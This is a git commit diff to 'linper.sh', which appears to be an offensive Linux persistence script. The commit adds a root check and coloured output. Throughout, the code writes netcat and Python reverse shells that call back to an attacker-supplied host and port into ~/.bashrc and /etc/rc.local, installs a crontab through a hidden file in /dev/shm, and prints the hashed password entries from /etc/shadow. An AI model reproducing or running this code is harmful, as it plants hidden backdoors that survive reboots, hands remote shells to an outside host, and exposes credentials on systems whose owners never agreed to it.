4caa04dd3d75cb8f7c1aa185316315d0107d6be4
montyonsecurity <jacobcainmontgomery@gmail.com>
2019-12-05 01:38:36 -0500

    fixed issue, bug fixes, features

--- linper.sh
+++ linper.sh
@@ -29,6 +29,11 @@ then
 	crontab=yes
 fi
 
+if $(id | grep -qi root)
+then
+	root=yes
+fi
+
 if [[ $home == "yes" ]];
 then
 	if [[ $nc == "yes" ]];
@@ -37,8 +42,8 @@ then
 		echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> ~/.bashrc
 		if $(grep nc ~/.bashrc | grep $attackBox | grep -qi $attackPort);
 		then
-			echo "[+] Netcat reverse shell placed in $USER's bashrc"
-			echo "[+] Calls back to $attackBox:$attackPort"
+			echo -e "\e[92m[+]\e[0m Netcat reverse shell placed in $USER's bashrc"
+			echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort"
 		fi
 	fi
 	if [[ $python == "yes" ]];
@@ -46,39 +51,47 @@ then
 		echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' 2> /dev/null & sleep .0001" >> ~/.bashrc
 		if $(grep python ~/.bashrc | grep $attackBox | grep -qi $attackPort)
 		then
-			echo "[+] Python reverse shell placed in $USER's bashrc"
-			echo "[+] Calls back to $attackBox:$attackPort"
+			echo -e "\e[92m[+]\e[0m Python reverse shell placed in $USER's bashrc"
+			echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort"
 		fi
 	fi
 
 fi
 
-if [[ $rclocal == "yes" ]];
+if [[ $root == "yes" ]];
 then
-	if [[ $python == "yes" ]];
+	if [[ $rclocal == "yes" ]];
 	then
-		if [[ $python == $nc ]];
+		if [[ $python == "yes" ]];
 		then
-			echo "/bin/sh -e" > /etc/rc.local &&
-			echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> /etc/rc.local 2> /dev/null &&
-			echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /etc/rc.local 2> /dev/null &&
-			echo "exit 0" >> /etc/rc.local 2> /dev/null &&
-			echo "[+] Netcat reverse shell placed in /etc/rc.local" &&
-			echo "[+] Calls back to $attackBox:$attackPort" &&
-			echo "[+] Python reverse shell placed in /etc/rc.local" &&
-			echo "[+] Calls back to $attackBox:$attackPort"
-		elif [[ $python != $nc ]];
+			if [[ $python == $nc ]];
+			then
+				echo "/bin/sh -e" > /etc/rc.local
+				echo "nc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001" >> /etc/rc.local
+				echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /etc/rc.local
+				echo "exit 0" >> /etc/rc.local
+				echo -e "\e[92m[+]\e[0m Netcat reverse shell placed in /etc/rc.local"
+				echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort"
+				echo -e "\e[92m[+]\e[0m Python reverse shell placed in /etc/rc.local"
+				echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort"
+			elif [[ $python != $nc ]];
+			then
+				echo "/bin/sh -e" > /etc/rc.local
+				echo "python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'" >> /etc/rc.local
+				echo "exit 0" >> /etc/rc.local
+				echo -e "\e[92m[+]\e[0m Python reverse shell placed in /etc/rc.local"
+				echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort"
+			fi
+		elif [[ $nc == "yes" ]];
 		then
-			echo "/bin/sh -e\npython -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"$attackBox\",$attackPort));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);'\nexit 0" > /etc/rc.local 2> /dev/null &&
-			echo "[+] Python reverse shell placed in /etc/rc.local" &&
-			echo "[+] Calls back to $attackBox:$attackPort"
+			echo "/bin/sh -e\nnc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001\nexit 0" > /etc/rc.local
+			echo -e "\e[92m[+]\e[0m Netcat reverse shell placed in /etc/rc.local"
+			echo -e "\e[92m[+]\e[0m Calls back to $attackBox:$attackPort"
 		fi
-	elif [[ $nc == "yes" ]];
-	then
-		echo "/bin/sh -e\nnc $attackBox $attackPort -e /bin/bash 2> /dev/null & sleep .0001\nexit 0" > /etc/rc.local 2> /dev/null &&
-		echo "[+] Netcat reverse shell placed in /etc/rc.local" &&
-		echo "[+] Calls back to $attackBox:$attackPort"
+		chmod +x /etc/rc.local
 	fi
+	echo -e "\e[92m[+]\e[0m Users with passwords from the shadow file"
+	egrep -v "\*|\!" /etc/shadow
 fi
 
 if [[ $crontab == "yes" ]];
@@ -94,6 +107,6 @@ then
 	fi
 	crontab /dev/shm/.cron.sh
 	rm /dev/shm/.cron.sh
-	echo "[+] This is the crontab you just installed for $(whoami)"
+	echo -e "\e[92m[+]\e[0m This is the crontab you just installed for $(whoami)"
 	crontab -l
 fi
